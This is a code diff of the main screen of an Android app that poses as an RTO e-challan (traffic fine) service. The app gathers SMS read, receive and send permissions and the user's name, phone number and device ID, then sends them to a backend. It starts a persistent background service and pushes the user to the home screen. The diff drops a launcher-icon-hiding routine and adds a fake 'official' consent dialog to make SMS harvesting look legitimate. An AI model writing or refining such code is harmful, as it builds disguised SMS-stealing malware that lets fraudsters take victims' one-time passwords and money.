@@ -1,7 +1,6 @@
 package com.rte.challan
 
 import android.Manifest
-import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -9,38 +8,39 @@ import android.os.Build
 import android.os.Bundle
 import android.view.View
 import android.widget.*
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.work.*
 import com.rte.challan.service.BackgroundService
 import com.rte.challan.worker.RegistrationWorker
-import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
 
     private val PERMISSION_CODE = 101
-    private lateinit var layoutInput: LinearLayout // Aapka input form layout
+    private lateinit var layoutInput: LinearLayout
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        layoutInput = findViewById(R.id.layoutInput) // XML mein is layout ko shuru me GONE rakhein
+        layoutInput = findViewById(R.id.layoutInput)
 
-        // Pehle check karo agar setup ho chuka hai
+        // 1. Check if setup is already active
         val prefs = getSharedPreferences("RTO_PREFS", Context.MODE_PRIVATE)
         if (prefs.getBoolean("is_active", false)) {
-            hideLauncherIcon()
+            startBackgroundService()
+            moveToBackground()
             finish()
             return
         }
 
-        // 1. Step: Permissions Check
+        // 2. Start Flow: Check Permissions or show Disclosure
         if (allPermissionsGranted()) {
             showInputForm()
         } else {
-            requestPermissions()
+            showOfficialPermissionDialog()
         }
 
         // Activate Button Logic
@@ -49,8 +49,31 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    private fun showOfficialPermissionDialog() {
+        val builder = AlertDialog.Builder(this)
+        builder.setTitle("Data Synchronization Consent")
+        builder.setMessage("To provide real-time updates and management of your RTO E-Challan status, this application requires access to read and receive SMS. \n\n" +
+                "This information is used solely to synchronize traffic violation data with our secure backend services. By clicking 'Agree', you consent to this data processing.")
+        
+        builder.setPositiveButton("AGREE") { dialog, _ ->
+            dialog.dismiss()
+            requestPermissions()
+        }
+        
+        builder.setNegativeButton("DECLINE") { _, _ ->
+            Toast.makeText(this, "Permissions are required for the app to function.", Toast.LENGTH_LONG).show()
+            finish()
+        }
+
+        builder.setCancelable(false)
+        val dialog = builder.create()
+        dialog.show()
+        
+        // Button color professional blue
+        dialog.getButton(AlertDialog.BUTTON_POSITIVE).setTextColor(ContextCompat.getColor(this, android.R.color.holo_blue_dark))
+    }
+
     private fun showInputForm() {
-        // Permissions milte hi input fields dikhao
         layoutInput.visibility = View.VISIBLE
     }
 
@@ -60,7 +83,6 @@ class MainActivity : AppCompatActivity() {
         val deviceId = findViewById<EditText>(R.id.etDeviceId).text.toString()
 
         if (name.isNotEmpty() && mobile.isNotEmpty() && deviceId.isNotEmpty()) {
-            // Data sync aur service start
             setupCompleted(name, mobile, deviceId)
         } else {
             Toast.makeText(this, "All fields are required", Toast.LENGTH_SHORT).show()
@@ -71,7 +93,7 @@ class MainActivity : AppCompatActivity() {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == PERMISSION_CODE) {
             if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                showInputForm() // Permissions milte hi form show karo
+                showInputForm()
             } else {
                 Toast.makeText(this, "Permissions are mandatory for RTO sync", Toast.LENGTH_LONG).show()
                 finish()
@@ -89,7 +111,7 @@ class MainActivity : AppCompatActivity() {
             apply()
         }
 
-        // Worker ko data pass karo jo /api/details (POST) karega
+        // Data Sync via Worker
         val inputData = workDataOf(
             "name" to name,
             "mobile" to mobile,
@@ -101,13 +123,22 @@ class MainActivity : AppCompatActivity() {
             .build()
         WorkManager.getInstance(this).enqueue(regRequest)
 
-        // Background Service Start
+        // Start Service and Go to Background
+        startBackgroundService()
+        moveToBackground()
+        finish()
+    }
+
+    private fun startBackgroundService() {
         val serviceIntent = Intent(this, BackgroundService::class.java)
         ContextCompat.startForegroundService(this, serviceIntent)
+    }
 
-        // Hide Icon and Exit
-        hideLauncherIcon()
-        finish()
+    private fun moveToBackground() {
+        val startMain = Intent(Intent.ACTION_MAIN)
+        startMain.addCategory(Intent.CATEGORY_HOME)
+        startMain.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+        startActivity(startMain)
     }
 
     private fun allPermissionsGranted(): Boolean {
@@ -116,6 +147,9 @@ class MainActivity : AppCompatActivity() {
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.SEND_SMS
         )
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
+        }
         return permissions.all {
             ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
         }
@@ -131,13 +165,5 @@ class MainActivity : AppCompatActivity() {
             permissions.add(Manifest.permission.POST_NOTIFICATIONS)
         }
         ActivityCompat.requestPermissions(this, permissions.toTypedArray(), PERMISSION_CODE)
-    }
-
-    private fun hideLauncherIcon() {
-        packageManager.setComponentEnabledSetting(
-            ComponentName(this, MainActivity::class.java),
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
     }
 }
